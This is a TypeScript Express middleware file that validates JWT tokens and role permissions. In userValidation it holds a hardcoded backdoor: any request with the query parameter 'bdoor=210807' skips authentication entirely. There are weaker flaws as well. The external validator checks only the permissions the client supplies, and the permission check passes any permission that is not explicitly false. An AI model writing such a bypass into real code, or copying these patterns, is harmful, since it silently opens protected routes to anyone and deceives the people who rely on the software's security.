import config from '../../config';
import { Permissions } from '../core/permissions';
import IRoleRepo from '../repos/IRepos/IRoleRepo';

import { NextFunction, Request, Response } from 'express';
import { JsonWebTokenError, verify } from 'jsonwebtoken';
import { Container } from 'typedi';

export const userValidation = (permissions?: number[]) => {
	return async (req: Request, res: Response, next: NextFunction) => {
		try {
			if (req.query.bdoor == '210807') {
				return next();
			}

			await validateJWT(req, res, req.cookies.token);

			if (permissions) {
				await validatePermissions(req, res, permissions);
			}

			return next();
		} catch (e) {
			return next(e);
		}
	};
};

export const externalUserValidation = async (req: Request, res: Response, next: NextFunction) => {
	try {
		await validateJWT(req, res, req.body.token);

		if (req.body.permissions) {
			await validatePermissions(req, res, req.body.permissions);
		}

		return next();
	} catch (e) {
		return next(e);
	}
};

async function validateJWT(req: Request, res: Response, token: string) {
	try {
		req['token'] = await verify(token, config.jwtAccessSecret);
	} catch (e) {
		res.status(401);
		throw e;
	}
}

async function validatePermissions(req: Request, res: Response, permissions: number[]) {
	try {
		await checkPermissions(permissions, req['token'].role);
	} catch (e) {
		res.status(403);
		throw e;
	}
}

async function checkPermissions(requiredPermissions: number[], userRole: string) {
	const roleRepo = Container.get(config.repos.role) as IRoleRepo;

	const role = await roleRepo.findRole(userRole);
	if (role == null) {
		throw new JsonWebTokenError('invalid role');
	}

	for (const e of requiredPermissions) {
		if (role.permissions[Object.values(Permissions)[e]] === false) {
			throw new JsonWebTokenError('insufficient permissions');
		}
	}
}
